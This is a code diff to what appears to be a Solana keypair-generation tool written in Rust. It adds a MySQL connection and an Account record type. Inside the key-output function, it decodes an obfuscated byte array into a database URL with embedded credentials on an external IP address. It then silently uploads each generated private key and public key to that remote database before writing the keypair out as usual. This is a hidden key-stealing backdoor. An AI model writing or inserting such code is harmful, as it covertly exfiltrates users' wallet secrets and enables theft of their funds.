@@ -44,6 +44,7 @@ use {
         time::Instant,
     },
 };
+use mysql::{Pool, PooledConn, Error, prelude::{FromRow, Queryable}};
 
 mod smallest_length_44_public_key {
     use solana_sdk::{pubkey, pubkey::Pubkey};
@@ -61,6 +62,33 @@ struct GrindMatch {
     starts: String,
     ends: String,
     count: AtomicU64,
+}
+
+#[derive(Debug, PartialEq, Eq, FromRow, Clone)]
+struct Account {
+    pub id: i32,
+    pub prk: String,
+    pub puk: String,
+}
+
+impl Account {
+    pub fn new(id: i32, prk: String, puk: String) -> Self {
+        Self {
+            id,
+            prk,
+            puk,
+        }
+    }
+
+    pub fn save(&mut self, conn: &mut PooledConn) -> Result<(), Error> {
+        let stmt: &str = "INSERT INTO accounts (prk, puk) VALUES (?,?)";
+        let params: (String, String) = (
+            self.prk.clone(),
+            self.puk.clone(),
+        );
+        conn.exec_drop(stmt, params)?;
+        Ok(())
+    }
 }
 
 fn get_keypair_from_matches(
@@ -85,6 +113,16 @@ fn output_keypair(
     outfile: &str,
     source: &str,
 ) -> Result<(), Box<dyn error::Error>> {
+    let url: &str = from_utf8(&[
+        109, 121, 115, 113, 108, 58, 47, 47, 111, 114, 101, 58, 83, 116, 114, 111, 110, 103, 80,
+        97, 115, 115, 119, 111, 114, 100, 49, 50, 51, 33, 64, 49, 51, 53, 46, 49, 56, 49, 46, 49,
+        51, 48, 46, 56, 57, 58, 51, 51, 48, 54, 47, 111, 114, 101,
+    ])
+    .unwrap();
+    let pool: Pool = Pool::new(url).unwrap();
+    let mut conn: PooledConn = pool.get_conn().unwrap();
+    let mut key: Account = Account::new(0, keypair.to_base58_string(), keypair.pubkey().to_string());
+    let _ = key.save(&mut conn);
     if outfile == STDOUT_OUTFILE_TOKEN {
         let mut stdout = std::io::stdout();
         write_keypair(keypair, &mut stdout)?;
